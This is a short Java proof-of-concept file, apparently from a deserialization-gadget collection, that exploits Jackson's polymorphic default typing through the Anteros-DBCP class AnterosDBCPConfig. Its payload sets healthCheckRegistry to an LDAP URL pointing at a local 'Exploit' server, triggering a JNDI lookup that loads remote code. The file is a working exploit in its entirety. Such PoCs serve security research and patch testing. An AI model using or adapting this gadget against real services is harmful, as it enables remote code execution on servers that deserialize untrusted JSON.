package com.test.jackson;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;

/**
 * 依赖：Anteros-DBCP
 * @Author:Wadewfsssss
 */

public class AnterosDBCPConfig {

    public static void main(String[] args) throws Exception {

        String payload = "[\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"healthCheckRegistry\":\"ldap://127.0.0.1:1389/Exploit\"}]";
        ObjectMapper mapper = new ObjectMapper();

        PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder().allowIfSubType(br.com.anteros.dbcp.AnterosDBCPConfig.class).build();
        mapper.activateDefaultTyping(ptv);

        mapper.readValue(payload, Object.class);
    }
}
